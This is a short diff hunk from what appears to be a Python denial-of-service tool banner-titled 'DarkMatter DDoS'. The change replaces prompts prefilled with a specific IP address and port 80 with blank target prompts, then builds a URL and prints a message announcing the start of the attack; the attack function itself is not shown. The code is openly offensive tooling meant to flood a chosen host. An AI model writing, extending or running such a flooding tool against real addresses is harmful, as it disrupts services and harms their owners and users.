@@ -43,8 +43,8 @@ def attack():
       pass
   
 print("Welcome To DarkMatter DDoS\n")
-ip = input("IP/Domain: 95.211.208.171")
-port = int(input("Port: 80"))
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
 sleep(1)
